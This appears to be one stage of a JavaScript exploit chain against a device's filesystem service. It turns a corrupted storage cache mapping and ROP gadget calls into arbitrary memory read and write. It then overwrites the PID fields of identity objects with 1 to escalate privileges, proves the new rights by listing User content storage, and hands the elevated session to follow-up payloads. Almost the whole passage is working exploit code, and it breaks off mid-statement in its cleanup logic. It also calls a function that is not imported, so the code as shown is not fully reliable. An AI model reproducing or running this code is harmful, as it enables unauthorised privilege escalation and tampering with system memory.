import coreRuntime from "../runtime.mjs";
import {isSafeCacheTail} from "../helpers/util.mjs";

const {
    AnalysisBytes,
    CachePlan,
    GADGET_MEMSET,
    RootLayout,
    allocPage,
    call_rop,
    cloneObject,
    closeHandle,
    hex32,
    ipcListDirectory,
    ipcStorageRead,
    ipcStorageWrite,
    prepPacket,
    read8,
    readDomainObjects,
    sendIPC,
    sendDomainCmd,
    write32,
    write8
} = coreRuntime;

// ----- PID promotion (S20) -----

/**
 * Promote a verified identity once every prerequisite address check and the root
 * stage have passed. The result carries the promotion status, the updated
 * cache-retirement state, and the callback that retires the retained session.
 */
export async function runPromotionStep(input) {
    const {config, addressPlan, addressReadVerified, candidateHandle,
        domainSession, helpers, rootStageVerified,
        verifiedIdentityTargets} = input;
    let addressCopy = input.addressCopy;
    let promotionAttempted = false;
    let promotionOutcome = null;
    let promotionRestored = true;
    let workerStateSafe = input.workerStateSafe;

    /*
     * Nothing is promoted until every prerequisite is proven. The session and the
     * candidate handle are kept only once the User access proof has succeeded.
     */
    if (hasPromotionPrerequisites(addressReadVerified, rootStageVerified,
                                  verifiedIdentityTargets, domainSession, candidateHandle, addressPlan)) {
        promotionAttempted = true;
        promotionOutcome = await runPromotionAndUserStorageProbe({
            config, addressPlan, addressCopy, domainSession, candidateHandle,
            helpers, verifiedIdentityTargets,
            savedHandle: input.savedHandle,
            onElevated: input.onElevated,
            readFsAddressBytes: helpers.readFsAddressBytes
        });
        addressCopy = promotionOutcome.addressCopy || addressCopy;

        if (addressCopy && addressCopy.workerStateSafe === false) {
            workerStateSafe = false;
        }

        promotionRestored = !!promotionOutcome.restored;

        if (!promotionRestored &&
            !promotionOutcome?.promotionRetained &&
            !promotionOutcome?.promoted) {
            workerStateSafe = false;
        }
    }

    return {promotionAttempted, promotionOutcome, promotionRestored,
        promotionRetained: !!promotionOutcome?.promotionRetained,
        addressCopy, workerStateSafe,
        downstreamCompleted: !!promotionOutcome?.downstreamCompleted,
        retireRetainedEndpoint: promotionOutcome &&
          promotionOutcome.retireRetainedEndpoint};
}

/**
 * S20: write PID 1 into the verified identity objects, then prove the new rights
 * by opening and listing User content storage.
 *
 * The transaction moves forward in one order:
 *   1. re-validate every identity snapshot, so a stale read aborts before any write;
 *   2. install the retained memory endpoint the writes go through;
 *   3. write the PID field of each identity object, then compare the whole object;
 *   4. verify each promoted object again through the retained endpoint;
 *   5. open and list User content storage, which is the actual proof of rights;
 *   6. run the dependent stages when the caller passed an `onElevated` callback.
 *
 * A throw anywhere above lands in the cleanup. That cleanup closes the User
 * filesystem, then either restores the original PID values or records that the
 * promoted endpoint stays active. This transaction owns the file-system objects,
 * so their handles are declared before the try block and released in the finally.
 *
 * The helpers below share `addressCopy`, `activePlan`, `retainedEndpoint` and
 * `outcome` through the closure. They read the same state the phases write, which
 * is why they live inside this function instead of at module level.
 *
 * @returns {object} Promotion, verification, restoration and retained-endpoint state.
 */
export async function runPromotionAndUserStorageProbe(input) {
    const {config, addressPlan, domainSession, candidateHandle, helpers,
        verifiedIdentityTargets, readFsAddressBytes} = input;
    const CONTROL_SIZE = config.CONTROL_SIZE;
    // Cache state, identity snapshots, the result and the reusable I/O buffers are all shared with the helpers below.
    let addressCopy = input.addressCopy;
    let activePlan = addressPlan;
    let retainedEndpoint = null;
    let retainedSetupStarted = false;
    let retainedEndpointReady = false;
    const outcome = {promoted: false, openedUserFs: false,
        listedUserRoot: false, restored: false, listCount: 0,
        downstreamStarted: false, downstreamCompleted: false,
        promotionRetained: false, contentFsHandleClosed: true,
        contentFsDomainObjectClosed: true};
    const fields = verifiedIdentityTargets.fields;

    /*
     * readFsAddressBytes can prepend bytes from the start of its 0x28000-byte cache
     * chunk, even for a 0x40-0x60-byte object. The buffer also has to hold the B
     * descriptor and the poison fill.
     */
    const readBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
    const writeBuf = allocPage(0x1000);

    // ----- Read an identity object through the active endpoint -----

    async function readObject(field, stage, plan) {
        if (retainedEndpointReady) {
            return retainedReadMemory(field.object, field.objectSize, stage);
        }

        const readPlan = plan || activePlan;

        if (!readPlan || readPlan !== activePlan) {
            throw new Error(stage + " " + field.name + " read refused: requested cache plan is not installed");
        }

        const reply = await readFsAddressBytes({config, addressPlan: readPlan,
            candidateHandle, address: field.object, length: field.objectSize,
            outputBuf: readBuf});

        if (!reply.ok) {
            throw new Error(stage + " " + field.name + " read failed: " +
                reply.error);
        }

        return reply.bytes;
    }

    // ----- Translate a target address into an IStorage offset -----

    function calculateWriteOffset(address, writePlan, stageName) {
        if (!writePlan || !writePlan.lowerWindow) {
            throw new Error(stageName + " has no qualified address plan");
        }

        const start = writePlan.lowerWindow.proposedStart;
        const end = writePlan.target + CONTROL_SIZE;

        if (!Number.isSafeInteger(address) || address < start ||
            address + 8 > end) {
            throw new Error(stageName + " is outside the qualified address window");
        }

        const offset = BigInt(address) - BigInt(writePlan.addressBias);

        if (offset < 0n || offset + 8n > BigInt(writePlan.storageSize) ||
            BigInt(writePlan.addressBias) + offset !== BigInt(address)) {
            throw new Error(stageName + " write offset is outside IStorage");
        }

        const cycle = BigInt(writePlan.cycle || config.ROOT_CAPTURE_CHUNK);
        const alignedBlock = offset / BigInt(CONTROL_SIZE) *
            BigInt(CONTROL_SIZE);

        if (cycle <= 0n || alignedBlock % cycle !== 0n) {
            throw new Error(stageName + " write offset is not in a qualified cache bucket: offset=0x" +
                offset.toString(16) + " aligned=0x" +
                alignedBlock.toString(16) + " cycle=0x" +
                cycle.toString(16));
        }

        return {address: address, offset: offset,
            alignedBlock: alignedBlock, cycle: cycle};
    }

    function writeOffsetForAddress(address, plan, stageName) {
        const writePlan = plan || activePlan;

        if (!writePlan || writePlan !== activePlan) {
            throw new Error(stageName + " write refused: no matching installed address plan");
        }

        return calculateWriteOffset(address, writePlan, stageName);
    }

    // ----- Build and validate a target-specific cache plan -----

    function buildTargetPlan(target, stageName) {
        const cycle = Number(addressPlan.cycle || config.ROOT_CAPTURE_CHUNK);
        const observedBlock = Math.floor(target / CONTROL_SIZE) *
            CONTROL_SIZE;
        const plan = CachePlan.buildLowerWindowPlan(target,
                                                    addressPlan.storageSize, cycle, [observedBlock]);

        if (plan.addressBias + plan.readOffset !== target ||
            Math.floor(plan.readOffset / CONTROL_SIZE) * CONTROL_SIZE % cycle !== 0) {
            throw new Error(stageName + " target plan failed address or bucket checks");
        }

        plan.lowerWindow.qualification = "retained-memory bootstrap target";
        const headerCheck = helpers.checkAddressHeaderEncoding(plan.bytes,
                                                               {savedHandle: addressCopy.savedHandle});

        if (!headerCheck.ok) {
            throw new Error(stageName + " target header encoding was rejected");
        }

        /*
         * Validate the proposed range before the plan is installed. A real write
         * still needs writeOffsetForAddress to see that exact plan active.
         */
        calculateWriteOffset(target, plan, stageName);
        return plan;
    }

    // ----- Install a cache plan by copying its header -----

    async function installPlan(plan, stageName) {
        if (activePlan === plan) {
            return;
        }

        if (!addressCopy || addressCopy.workerStateSafe === false) {
            throw new Error(stageName + " refused: address-copy worker state is unsafe");
        }

        /*
         * A failed or partial header copy leaves the active mapping unknown, so no
         * read is authorized until the copy helper accepts the new header.
         */
        activePlan = null;
        const installed = await helpers.installAddressHeader({...addressCopy,
            desiredBytes: plan.bytes, stageName});
        addressCopy = installed.addressCopy || addressCopy;

        if (!installed.ok) {
            throw new Error(stageName + " cache-header copy was not qualified");
        }

        activePlan = plan;
    }

    // ----- Read through the active cache mapping -----

    async function readMappedMemory(address, length, stageName, plan) {
        const readPlan = plan || activePlan;

        if (!readPlan || readPlan !== activePlan) {
            throw new Error(stageName + " read refused: no matching installed mapping");
        }

        const reply = await helpers.readFsAddressBytes({config,
            addressPlan: readPlan, candidateHandle, address, length,
            outputBuf: readBuf});

        if (!reply.ok) {
            throw new Error(stageName + " read failed: " + reply.error);
        }

        return reply.bytes;
    }

    // ----- Byte-level primitives -----

    function u64Bytes(value) {
        const bytes = new Array(8);
        AnalysisBytes.writeU64LE(bytes, 0, BigInt(value));
        return bytes;
    }

    function zeroBytes(length) {
        const bytes = new Array(length);
        for (let i = 0; i < length; i++) {
            bytes[i] = 0;
        }
        return bytes;
    }

    function cacheEntry(offset, address) {
        const bytes = zeroBytes(0x30);
        AnalysisBytes.writeU64LE(bytes, 0, BigInt(offset));
        AnalysisBytes.writeU64LE(bytes, 8, 0x4000n);
        bytes[0x10] = 1;
        bytes[0x11] = 1;
        bytes[0x12] = 1;
        AnalysisBytes.writeU64LE(bytes, 0x20, BigInt(address));
        AnalysisBytes.writeU64LE(bytes, 0x28, 0x4000n);
        return bytes;
    }


    // ----- Offset-based IStorage reads and writes -----

    async function logicalRead(offset, length, stageName) {
        if (isInvalidLogicalRead(offset, length, addressPlan)) {
            throw new Error(stageName + " logical read is outside IStorage");
        }

        call_rop(GADGET_MEMSET, readBuf, 0xA5n, BigInt(length));
        const reply = ipcStorageRead(candidateHandle, offset, length, readBuf);

        if (reply.error !== 0 || reply.transport !== 0) {
            throw new Error(stageName + " IStorage::Read transport=" +
                hex32(reply.transport || 0) + " result=" + hex32(reply.error));
        }

        const bytes = new Array(length);
        for (let i = 0; i < length; i++) {
            bytes[i] = Number(read8(readBuf + BigInt(i)));
        }
        return bytes;
    }

    async function logicalWrite(offset, bytes, stageName) {
        if (isInvalidLogicalWrite(offset, bytes, addressPlan)) {
            throw new Error(stageName + " logical write is outside IStorage");
        }

        let allZero = true;
        for (let i = 0; i < bytes.length; i++) {
            allZero = allZero && bytes[i] === 0;
        }

        if (allZero) {
            call_rop(GADGET_MEMSET, writeBuf, 0n, BigInt(bytes.length));
        } else {
            for (let i = 0; i < bytes.length; i++) {
                write8(writeBuf + BigInt(i), BigInt(bytes[i]));
            }
        }

        const reply = ipcStorageWrite(candidateHandle, BigInt(offset),
                                      writeBuf, bytes.length);

        if (reply.transport !== 0 || reply.error !== 0) {
            throw new Error(stageName + " IStorage::Write transport=" +
                hex32(reply.transport || 0) + " result=" + hex32(reply.error));
        }
    }

    async function bootstrapWrite(address, bytes, plan, stageName) {
        const writePlan = plan || activePlan;
        const offset = BigInt(address) - BigInt(writePlan.addressBias);
        const within = offset % BigInt(CONTROL_SIZE);

        if (isInvalidBootstrapWrite(writePlan, activePlan, offset, within,
                                    bytes, address, CONTROL_SIZE)) {
            throw new Error(stageName + " is outside the retained bootstrap block");
        }

        const writeAt = writeOffsetForAddress(address, writePlan, stageName);
        await logicalWrite(Number(writeAt.offset), bytes, stageName);
        const observed = await readMappedMemory(address, bytes.length,
                                                stageName + " readback", writePlan);

        if (!AnalysisBytes.equal(observed, bytes)) {
            throw new Error(stageName + " readback differs");
        }
    }

    // ----- Retained two-bucket endpoint -----

    async function controlRead(offset, length) {
        if (!retainedEndpoint || offset < 0 ||
            offset + length > retainedEndpoint.arrayLength) {
            throw new Error("retained control read is outside its owned cache array");
        }

        return logicalRead(offset, length, "retained control read");
    }

    async function controlWrite(offset, bytes) {
        if (!retainedEndpoint || offset < 0 ||
            offset + bytes.length > retainedEndpoint.arrayLength) {
            throw new Error("retained control write is outside its owned cache array");
        }

        await logicalWrite(offset, bytes, "retained control write");
    }

    async function setRetainedPointer(address) {
        const state = retainedEndpoint;

        if (isInvalidRetainedPointerTarget(state, address)) {
            throw new Error("invalid retained pointer target");
        }

        const entry = await controlRead(state.dataEntryOffset, 0x30);

        if (hasChangedRetainedDataDescriptor(entry, state)) {
            throw new Error("retained data descriptor changed");
        }

        if (address !== state.pointer) {
            await controlWrite(state.dataEntryOffset + 0x20,
                               u64Bytes(BigInt(address)));
            const observed = await controlRead(state.dataEntryOffset + 0x20, 8);

            if (!AnalysisBytes.equal(observed, u64Bytes(BigInt(address)))) {
                throw new Error("retained pointer readback differs");
            }

            state.pointer = address;
        }
    }

    async function retainedReadMemory(address, length, stageName) {
        const state = retainedEndpoint;

        if (isInvalidRetainedReadRange(state, address, length)) {
            throw new Error(stageName + " invalid retained-memory range");
        }

        const parts = [];
        for (let at = 0; at < length; at += 0x4000) {
            await setRetainedPointer(address + at);
            parts.push(await logicalRead(state.dataOffset,
                                         Math.min(0x4000, length - at), stageName));
        }
        const result = [];
        for (let pi = 0; pi < parts.length; pi++) {
            for (let bi = 0; bi < parts[pi].length; bi++) {
                result.push(parts[pi][bi]);
            }
        }
        return result;
    }

    async function retainedWriteMemory(address, bytes, stageName) {
        const state = retainedEndpoint;

        if (isInvalidRetainedWriteRange(state, address, bytes)) {
            throw new Error(stageName + " invalid retained-memory write range");
        }

        for (let at = 0; at < bytes.length; at += 0x4000) {
            const part = bytes.slice(at, at + 0x4000);
            await setRetainedPointer(address + at);
            await logicalWrite(state.dataOffset, part, stageName);
            const observed = await logicalRead(state.dataOffset, part.length,
                                               stageName + " readback");

            if (!AnalysisBytes.equal(observed, part)) {
                throw new Error(stageName + " retained write readback differs");
            }
        }
    }

    async function retainedWriteMemoryUnverified(address, bytes, stageName) {
        const state = retainedEndpoint;

        if (isInvalidUnverifiedRetainedWriteRange(state, address, bytes)) {
            throw new Error(stageName + " invalid unverified retained-memory write");
        }

        await setRetainedPointer(address);
        await logicalWrite(state.dataOffset, bytes, stageName);
    }

    async function compareWriteFsMemory(address, expectedBefore,
                                        expectedAfter, stageName) {
        if (!outcome.promoted || !retainedEndpointReady) {
            throw new Error(stageName + " requires the verified elevated endpoint");
        }

        if (hasInvalidWriteSnapshots(address, expectedBefore, expectedAfter)) {
            throw new Error(stageName + " requires equal, bounded byte snapshots");
        }

        const before = await retainedReadMemory(address, expectedBefore.length,
                                                stageName + " precondition");

        if (!AnalysisBytes.equal(before, expectedBefore)) {
            throw new Error(stageName + " precondition differs; no write issued");
        }

        await retainedWriteMemory(address, expectedAfter, stageName);
        const after = await retainedReadMemory(address, expectedAfter.length,
                                               stageName + " readback");

        if (!AnalysisBytes.equal(after, expectedAfter)) {
            throw new Error(stageName + " exact readback differs");
        }

        return {address, length: expectedAfter.length, verified: true};
    }

    async function installRetainedEndpoint(layout) {
        if (isInvalidRetainedEndpointLayout(layout)) {
            throw new Error("no unique qualified retained cache array/owner pair");
        }

        const array = layout.array;
        const owner = layout.owner;

        if (isInvalidRetainedEndpointStructure(layout, addressPlan, array, owner)) {
            throw new Error("retained owner snapshot failed structural checks");
        }


        const arrayPlan = buildTargetPlan(array, "retained cache array");
        retainedSetupStarted = true;
        await installPlan(arrayPlan, "cache-retained-array");
        const before = await readMappedMemory(array, 0x5A0,
                                              "retained cache array snapshot", arrayPlan);

        if (isInvalidRetainedCacheArraySnapshot(before, arrayPlan)) {
            throw new Error("retained bootstrap does not expose its recognized owned cache array");
        }

        const dataOffset = 0x4000;
        const dataEntryOffset = 0x90;
        const scratchOffset = 0x5A0 - 0x18;
        const scratchAddress = array + scratchOffset;
        const originalScratch = before.slice(scratchOffset, scratchOffset + 16);

        if (before.slice(0x30).some(Boolean)) {
            await bootstrapWrite(array + 0x30, zeroBytes(0x5A0 - 0x30),
                                 arrayPlan, "retained clear unused cache entries");
        }

        // Scratch marker for the retained endpoint's data-channel read/write check.
        const marker = [0x52, 0x45, 0x54, 0x41, 0x49, 0x4E, 0x45, 0x44,
            0x00, 0xFF, 0x11, 0x22, 0xAA, 0x55, 0x99, 0x66];
        const secondMarker = [0x52, 0x45, 0x54, 0x41, 0x49, 0x4E, 0x45, 0x44,
            0x01, 0xEE, 0x22, 0x33, 0xBB, 0x66, 0xAA, 0x77];
        await bootstrapWrite(scratchAddress, marker, arrayPlan,
                             "retained scratch marker");
        const dataHeader = cacheEntry(dataOffset, scratchAddress);
        await bootstrapWrite(array + dataEntryOffset, dataHeader, arrayPlan,
                             "retained data descriptor");

        if (!AnalysisBytes.equal(await logicalRead(dataOffset, 16,
                                                   "retained data channel proof"), marker)) {
            throw new Error("retained data descriptor did not read its scratch marker");
        }

        await logicalWrite(dataOffset, secondMarker,
                           "retained scratch data-channel write");

        if (!AnalysisBytes.equal(await readMappedMemory(scratchAddress, 16,
                                                        "retained scratch cross-channel readback", arrayPlan),
                                 secondMarker)) {
            throw new Error("retained data channel did not update the owned scratch marker");
        }

        await logicalWrite(dataOffset, originalScratch,
                           "retained scratch restoration");

        if (!AnalysisBytes.equal(await readMappedMemory(scratchAddress, 16,
                                                        "retained scratch restoration readback", arrayPlan),
                                 originalScratch)) {
            throw new Error("retained scratch bytes were not restored");
        }

        // Point the data descriptor at the array itself, so control access goes through it.
        await bootstrapWrite(array + dataEntryOffset + 0x20,
                             u64Bytes(BigInt(array)), arrayPlan,
                             "retained control descriptor retarget");
        const releasedControl = await logicalRead(dataOffset, 0x30,
                                                  "retained control channel proof");

        if (AnalysisBytes.readU64LE(releasedControl, 0) !==
                AnalysisBytes.readU64LE(arrayPlan.bytes, 0) ||
            AnalysisBytes.readU64LE(releasedControl, 8) !==
                AnalysisBytes.readU64LE(arrayPlan.bytes, 8)) {
            throw new Error("retained data channel did not reach its control descriptor");
        }

        const canonicalDataHeader = cacheEntry(dataOffset, array);
        await logicalWrite(dataOffset, cacheEntry(0, array),
                           "retained canonical control descriptor");
        const controlArray = await logicalRead(0, 0x5A0,
                                               "retained canonical control readback");

        if (AnalysisBytes.readU64LE(controlArray, 0) !== 0n ||
            AnalysisBytes.readU64LE(controlArray, 8) !== 0x4000n ||
            controlArray[0x10] !== 0 ||
            !AnalysisBytes.equal(controlArray.slice(dataEntryOffset,
                                                    dataEntryOffset + 0x30), canonicalDataHeader)) {
            throw new Error("retained two-bucket descriptors are not canonical");
        }

        retainedEndpoint = {array, owner, arrayLength: 0x5A0, dataOffset,
            dataEntryOffset, scratchOffset, pointer: array,
            ownerBefore: layout.ownerBytes.slice(), ready: false,
            canonical: true};

        // Stop the owner's cache loop, so no background iteration runs.
        await setRetainedPointer(owner);
        const ownerBefore = await logicalRead(dataOffset, 0x78,
                                              "retained owner precondition");

        if (isInvalidRetainedOwnerSnapshot(ownerBefore, addressPlan, array, 10)) {
            throw new Error("retained owner changed before cache-loop disable");
        }

        await logicalWrite(dataOffset + 0x58, [0, 0, 0, 0],
                           "retained cache-loop disable");
        const ownerAfter = await logicalRead(dataOffset, 0x78,
                                             "retained owner zero-count readback");

        if (isInvalidRetainedOwnerSnapshot(ownerAfter, addressPlan, array, 0)) {
            throw new Error("retained cache-loop count did not read back as zero");
        }

        // Final proof: a scratch roundtrip with the cache loop disabled.
        await setRetainedPointer(scratchAddress);

        if (!AnalysisBytes.equal(await logicalRead(dataOffset, 16,
                                                   "retained post-disable scratch read"), originalScratch)) {
            throw new Error("retained scratch changed after cache-loop disable");
        }

        await logicalWrite(dataOffset, marker,
                           "retained post-disable scratch write");

        if (!AnalysisBytes.equal(await controlRead(scratchOffset, 16), marker)) {
            throw new Error("retained control channel missed the post-disable scratch write");
        }

        await logicalWrite(dataOffset, originalScratch,
                           "retained post-disable scratch restore");

        if (!AnalysisBytes.equal(await controlRead(scratchOffset, 16),
                                 originalScratch)) {
            throw new Error("retained scratch restoration after disable differs");
        }

        retainedEndpoint.ready = true;
        retainedEndpointReady = true;
        addressCopy = {...addressCopy, retainedEndpointActive: true};
    }

    async function retireRetainedEndpoint() {
        const state = retainedEndpoint;

        if (isInvalidRetainedEndpointState(retainedEndpointReady, state, outcome)) {
            throw new Error("retained endpoint is not in a verified state");
        }

        if (!outcome.restored) {
            for (const field of fields) {
                const currentIdentity = await readObject(field,
                                                         "retained endpoint pre-retirement identity check");

                if (!field.expectedPromotedBytes ||
                    !AnalysisBytes.equal(currentIdentity,
                                         field.expectedPromotedBytes)) {
                    throw new Error(field.name + " changed before endpoint retirement");
                }
            }
        }

        await setRetainedPointer(state.owner);
        const owner = await logicalRead(state.dataOffset, 0x78,
                                        "retained owner retirement check");

        if (isInvalidRetainedOwnerRetirementSnapshot(owner, addressPlan, state)) {
            throw new Error("retained owner no longer has the verified zero-count layout");
        }

        state.ready = false;
        state.retired = true;
        outcome.addressCopy = {...outcome.addressCopy,
            retainedEndpointRetired: true};
        return {retired: true, addressCopy: outcome.addressCopy};
    }

    /*
     * The finalizer owns every resource opened in this transaction, so the handles
     * are declared before the try block and released in the finally.
     */
    let contentFsHandle = 0;
    let contentFsObjectIds = [];
    let downstreamSafeToRestore = true;
    let promotedSessionRetained = false;

    try {
        if (isInvalidPromotionProbePrerequisites(domainSession,
                                                 verifiedIdentityTargets, candidateHandle, addressPlan)) {
            throw new Error("the verified root, candidate IStorage, or address plan is unavailable");
        }

        // ----- Phase 1: Validate identity snapshots before writing -----
        for (let i = 0; i < fields.length; i++) {
            const field = fields[i];

            if (hasInvalidIdentityFieldSnapshot(field)) {
                throw new Error(field.name + " stored identity snapshot is inconsistent");
            }

            for (let prior = 0; prior < i; prior++) {
                const previous = fields[prior];

                if (field.object < previous.object + previous.objectSize &&
                    previous.object < field.object + field.objectSize) {
                    throw new Error(field.name + " overlaps the " +
                        previous.name + " identity object");
                }
            }
            const current = await readObject(field, "pre-write");

            if (!AnalysisBytes.equal(current, field.beforeBytes)) {
                throw new Error(field.name + " object changed since the original verification");
            }

            field.expectedPromotedBytes = field.beforeBytes.slice();
            AnalysisBytes.writeU64LE(field.expectedPromotedBytes,
                                     field.pidOffset, 1n);
        }

        // ----- Phase 2: Install the retained memory endpoint -----
        await installRetainedEndpoint(verifiedIdentityTargets.retainedCache);
        for (let ei = 0; ei < fields.length; ei++) {
            const endpointField = fields[ei];
            const endpointRead = await readObject(endpointField,
                                                  "retained-endpoint freshness");

            if (!AnalysisBytes.equal(endpointRead,
                                     endpointField.beforeBytes)) {
                throw new Error(endpointField.name + " object changed during retained endpoint installation");
            }
        }

        // ----- Phase 3: Write the promoted PID values -----
        for (let wi = 0; wi < fields.length; wi++) {
            const target = fields[wi];

            if (target.before === 1n) {
                continue;
            }

            const pidAddress = target.object + target.pidOffset;
            const immediatelyBefore = await readObject(target,
                                                       "before " + target.name + " write");

            if (!AnalysisBytes.equal(immediatelyBefore,
                                     target.beforeBytes)) {
                throw new Error(target.name + " changed before its PID write");
            }

            await retainedWriteMemory(pidAddress, u64Bytes(1n),
                                      "retained PID write " + target.name);
            const after = await readObject(target,
                                           "after " + target.name + " write");
            const exactPromoted = AnalysisBytes.equal(after,
                                                      target.expectedPromotedBytes);

            if (!exactPromoted) {
                throw new Error(target.name + " write did not produce the exact expected object");
            }
        }

        // ----- Phase 4: Verify the promoted identity objects -----
        for (let vi = 0; vi < fields.length; vi++) {
            const verifiedField = fields[vi];
            const promotedRead = await readObject(verifiedField,
                                                  "promoted verification");

            if (!AnalysisBytes.equal(promotedRead,
                                     verifiedField.expectedPromotedBytes) ||
                AnalysisBytes.readU64LE(promotedRead,
                                        verifiedField.pidOffset) !== 1n) {
                throw new Error(verifiedField.name + " PID=1 full-object verification failed");
            }
        }
        outcome.promoted = true;
        // ----- Phase 5: Prove access to User content storage -----
        const openPacket = allocPage(0x2000);
        const openReply = sendDomainCmd(domainSession.handle,
                                        domainSession.rootObj, 110, openPacket,
                                        function() {
                                            write32(openPacket + 0x30n, 1n);
                                        }, 4);
        outcome.openTransport = openReply.transport;
        outcome.openResult = openReply.result;
        outcome.openObjects = openReply.objCount;
        let fsObjects;

        if (openReply.ok) {
            fsObjects = readDomainObjects(openPacket, openReply.objCount, 0);
        } else {
            fsObjects = [];
        }

        contentFsObjectIds = fsObjects;

        if (!openReply.ok || openReply.transport !== 0 ||
            openReply.result !== 0 || openReply.objCount !== 1) {
            throw new Error("final User content-storage open failed");
        }

        if (fsObjects.length !== 1 || !fsObjects[0]) {
            throw new Error("OpenContentStorageFileSystem returned no IFileSystem object");
        }

        outcome.openedUserFs = true;

        contentFsHandle = cloneObject(domainSession.handle, fsObjects[0]);

        if (!contentFsHandle) {
            throw new Error("could not clone the returned User content filesystem");
        }

        const listing = ipcListDirectory(contentFsHandle, "/", 3);
        outcome.listCount = listing.entries.length;
        outcome.listedUserRoot = listing.error === 0;
        outcome.listTransport = listing.readTransport;
        outcome.listResult = listing.error;
        outcome.listEntriesRead = listing.entriesRead;

        if (listing.error !== 0) {
            throw new Error("User content-storage root listing failed");
        }

        outcome.userStorageTestPassed = true;
        /* Public handoff: this verified elevated session is what follow-up payloads get. */
        globalThis.fspSrv = domainSession;
        promotedSessionRetained = true;
        outcome.promotionRetained = true;

        // ----- Phase 6: Run dependent stages while elevated -----
        if (typeof input.onElevated === "function") {
            outcome.downstreamStarted = true;
            downstreamSafeToRestore = false;
            outcome.downstream = await input.onElevated({
                domainSession,
                savedHandle: input.savedHandle || addressCopy.savedHandle,
                candidateHandle,
                addressPlan,
                domainLayout: verifiedIdentityTargets.domainLayout,
                readFsMemory: (address, length, stageName) =>
                    retainedReadMemory(address, length,
                                       stageName || "dependent FS read"),
                writeFsMemoryUnverified: (address, bytes, stageName) =>
                    retainedWriteMemoryUnverified(address, bytes,
                                                  stageName || "dependent FS one-shot write"),
                compareWriteFsMemory,
                identityObjects: fields.map(function(field) {
                    return {name: field.name, object: field.object,
                        objectSize: field.objectSize, pidOffset: field.pidOffset,
                        pid: field.before,
                        originalBytes: field.beforeBytes.slice(),
                        promotedBytes: field.expectedPromotedBytes.slice()};
                })
            });
            outcome.downstreamCompleted = !!outcome.downstream?.completed;
            downstreamSafeToRestore = !!outcome.downstream?.safeToRestore;

            if (!outcome.downstreamCompleted || !downstreamSafeToRestore) {
                throw new Error("dependent stages did not prove a safe handoff for PID restoration");
            }
        }
    } catch (error) {
        outcome.error = error.message;
    } finally {
        // ----- Cleanup: close the User filesystem handle -----
        if (contentFsHandle) {
            try {
                const fsClose = Number(closeHandle(contentFsHandle)) >>> 0;
                outcome.fsCloseResult = fsClose;
                outcome.contentFsHandleClosed = fsClose === 0;
            } catch (error) {
                outcome.contentFsHandleClosed = false;
                outcome.contentFsHandleCloseError =
                    String(error?.message || error);
            }
            contentFsHandle = 0;
        }

        outcome.contentFsObjectCloseResults = [];
        for (const objectId of contentFsObjectIds) {
            try {
                const objectClose = closeDomainObject(domainSession.handle,
                                                      objectId);
                outcome.contentFsObjectCloseResults.push(objectClose);

                if (objectClose !== 0) {
                    outcome.contentFsDomainObjectClosed = false;
                }
            } catch (error) {
                outcome.contentFsDomainObjectClosed = false;
                outcome.contentFsObjectCloseResults.push(String(error?.message || error));
            }
        }
        contentFsObjectIds = [];

        if (promotedSessionRetained) {
            addressCopy = {...addressCopy,
                retainedEndpointActive: retainedEndpointReady};
            outcome.restored = false;
            outcome.promotionRetained = true;
            outcome.retainedEndpointActive = retainedEndpointReady;
            outcome.restoreFailureDetails = [];
        } else if (outcome.promoted) {
            addressCopy = {...addressCopy,
                retainedEndpointActive: retainedEndpointReady};
            outcome.restored = false;
            outcome.promotionRetained = false;
            outcome.pidsRemainPromoted = true;
            outcome.retainedEndpointActive = retainedEndpointReady;
            outcome.restoreFailureDetails = [];
        } else {
            // ----- Cleanup: restore the original PID values -----
            let restoreOk = true;
            const restoreFailureDetails = [];

            if (retainedEndpointReady && !downstreamSafeToRestore) {
                restoreOk = false;
                restoreFailureDetails.push("dependent-stages-left-live-state-unverified");
                addressCopy = {...addressCopy, workerStateSafe: false,
                    retainedEndpointUnsafe: true};
            } else if (retainedEndpointReady) {
                const restoreStates = new Array(fields.length);
                for (let ci = 0; ci < fields.length; ci++) {
                    const checkField = fields[ci];
                    try {
                        const checkedBytes = await readObject(checkField,
                                                              "retained restore check");

                        if (AnalysisBytes.equal(checkedBytes,
                                                checkField.beforeBytes)) {
                            restoreStates[ci] = "original";
                        } else if (checkField.expectedPromotedBytes &&
                                AnalysisBytes.equal(checkedBytes,
                                                    checkField.expectedPromotedBytes)) {
                            restoreStates[ci] = "promoted";
                        } else {
                            restoreStates[ci] = "unknown";
                            restoreOk = false;
                            restoreFailureDetails.push(checkField.name + ": changed-from-both-snapshots");
                        }
                    } catch (readError) {
                        restoreStates[ci] = "unreadable";
                        restoreOk = false;
                        restoreFailureDetails.push(checkField.name + ": retained-read-failed: " + readError.message);
                    }
                }

                for (let ri = fields.length - 1; ri >= 0; ri--) {
                    const restoreField = fields[ri];

                    if (restoreStates[ri] !== "promoted") {
                        continue;
                    }

                    try {
                        const currentForRestore = await readObject(restoreField,
                                                                   "retained restore target check");

                        if (!restoreField.expectedPromotedBytes ||
                            !AnalysisBytes.equal(currentForRestore,
                                                 restoreField.expectedPromotedBytes)) {
                            restoreOk = false;
                            restoreFailureDetails.push(restoreField.name + ": changed-before-restore-write");
                            continue;
                        }

                        await retainedWriteMemory(restoreField.object + restoreField.pidOffset,
                                                  u64Bytes(restoreField.before),
                                                  "retained PID restoration " + restoreField.name);
                        const restoredBytes = await readObject(restoreField,
                                                               "retained restore readback");
                        const exactRestore = AnalysisBytes.equal(restoredBytes,
                                                                 restoreField.beforeBytes);

                        if (!exactRestore) {
                            restoreOk = false;
                        }

                        if (!exactRestore) {
                            restoreFailureDetails.push(restoreField.name + ": exact-object-readback-failed");
                        }

                        if (exactRestore) {
                            restoreStates[ri] = "original";
                        }
                    } catch (restoreError) {
                        restoreOk = false;
                        restoreFailureDetails.push(restoreField.name + ": restore-failed: " + restoreError.message);
                    }
                }

                for (let fi = 0; fi < fields.length; fi++) {
                    try {
                        const finalBytes = await readObject(fields[fi],
                                                            "final retained restore verification");
                        const exact = AnalysisBytes.equal(finalBytes,
                                                          fields[fi].beforeBytes);

                        if (!exact) {
                            restoreOk = false;
                            restoreFailureDetails.push(fields[fi].name + ": final-object-verification-failed");
                        }
                    } catch (finalReadError) {
                        restoreOk = false;
                        restoreFailureDetails.push(fields[fi].name + ": final-read-failed: " + finalReadError.message);
                    }
                }
                addressCopy = {...addressCopy, retainedEndpointActive: true};
            } else {
                if (retainedSetupStarted) {
                    restoreOk = false;
                    restoreFailureDetails.push("retained-endpoint-setup-partial");

                    if (activePlan !== addressPlan &&
